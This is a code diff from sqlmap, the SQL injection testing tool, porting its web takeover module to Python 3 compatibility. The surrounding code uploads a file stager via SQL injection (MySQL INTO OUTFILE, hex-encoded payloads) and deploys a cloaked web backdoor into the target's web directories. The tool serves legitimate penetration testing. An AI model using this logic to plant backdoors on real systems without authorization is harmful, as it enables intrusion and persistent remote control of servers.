@@ -1,16 +1,15 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python
 
 """
 Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
+import io
 import os
 import posixpath
 import re
-import StringIO
 import tempfile
-import urlparse
 
 from extra.cloak.cloak import decloak
 from lib.core.agent import agent
@@ -21,23 +20,27 @@ from lib.core.common import getAutoDirectories
 from lib.core.common import getManualDirectories
 from lib.core.common import getPublicTypeMembers
 from lib.core.common import getSQLSnippet
-from lib.core.common import getUnicode
 from lib.core.common import ntToPosixSlashes
 from lib.core.common import isTechniqueAvailable
 from lib.core.common import isWindowsDriveLetterPath
 from lib.core.common import normalizePath
+from lib.core.common import openFile
 from lib.core.common import parseFilePaths
 from lib.core.common import posixToNtSlashes
 from lib.core.common import randomInt
 from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.common import singleTimeWarnMessage
-from lib.core.convert import hexencode
-from lib.core.convert import utf8encode
+from lib.core.compat import xrange
+from lib.core.convert import encodeHex
+from lib.core.convert import getBytes
+from lib.core.convert import getText
+from lib.core.convert import getUnicode
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import paths
+from lib.core.datatype import OrderedSet
 from lib.core.enums import DBMS
 from lib.core.enums import HTTP_HEADER
 from lib.core.enums import OS
@@ -51,7 +54,7 @@ from lib.core.settings import SHELL_RUNCMD_EXE_TAG
 from lib.core.settings import SHELL_WRITABLE_DIR_TAG
 from lib.core.settings import VIEWSTATE_REGEX
 from lib.request.connect import Connect as Request
-from thirdparty.oset.pyoset import oset
+from thirdparty.six.moves import urllib as _urllib
 
 class Web:
     """
@@ -93,11 +96,17 @@ class Web:
             if filepath.endswith('_'):
                 content = decloak(filepath)  # cloaked file
             else:
-                with open(filepath, "rb") as f:
+                with openFile(filepath, "rb", encoding=None) as f:
                     content = f.read()
 
         if content is not None:
-            stream = StringIO.StringIO(content)  # string content
+            stream = io.BytesIO(getBytes(content))  # string content
+
+            # Reference: https://github.com/sqlmapproject/sqlmap/issues/3560
+            # Reference: https://stackoverflow.com/a/4677542
+            stream.seek(0, os.SEEK_END)
+            stream.len = stream.tell()
+            stream.seek(0, os.SEEK_SET)
 
         return self._webFileStreamUpload(stream, destFileName, directory)
 
@@ -122,7 +131,7 @@ class Web:
 
             page, _, _ = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)
 
-            if "File uploaded" not in page:
+            if "File uploaded" not in (page or ""):
                 warnMsg = "unable to upload the file through the web file "
                 warnMsg += "stager to '%s'" % directory
                 logger.warn(warnMsg)
@@ -145,7 +154,7 @@ class Web:
                 randInt = randomInt()
                 query += "OR %d=%d " % (randInt, randInt)
 
-        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery, conf.encoding))
+        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=encodeHex(uplQuery, binary=False))
         query = agent.prefixQuery(query)        # Note: No need for suffix as 'write_file_limit' already ends with comment (required)
         payload = agent.payload(newValue=query)
         page = Request.queryPage(payload)
@@ -254,9 +263,9 @@ class Web:
 
         directories = list(arrayizeValue(getManualDirectories()))
         directories.extend(getAutoDirectories())
-        directories = list(oset(directories))
+        directories = list(OrderedSet(directories))
 
-        path = urlparse.urlparse(conf.url).path or '/'
+        path = _urllib.parse.urlparse(conf.url).path or '/'
         path = re.sub(r"/[^/]*\.\w+\Z", '/', path)
         if path != '/':
             _ = []
@@ -267,9 +276,9 @@ class Web:
             directories = _
 
         backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webPlatform)
-        backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoors", "backdoor.%s_" % self.webPlatform))
+        backdoorContent = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoors", "backdoor.%s_" % self.webPlatform)))
 
-        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform))
+        stagerContent = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform)))
 
         for directory in directories:
             if not directory:
@@ -295,7 +304,7 @@ class Web:
 
             for match in re.finditer('/', directory):
                 self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
-                self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
+                self.webStagerUrl = _urllib.parse.urljoin(self.webBaseUrl, stagerName)
                 debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
                 logger.debug(debugMsg)
 
@@ -323,16 +332,16 @@ class Web:
                     handle, filename = tempfile.mkstemp()
                     os.close(handle)
 
-                    with open(filename, "w+b") as f:
-                        _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform))
-                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, utf8encode(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
+                    with openFile(filename, "w+b") as f:
+                        _ = getText(decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform)))
+                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
                         f.write(_)
 
                     self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)
 
                     for match in re.finditer('/', directory):
                         self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
-                        self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
+                        self.webStagerUrl = _urllib.parse.urljoin(self.webBaseUrl, stagerName)
 
                         debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
                         logger.debug(debugMsg)
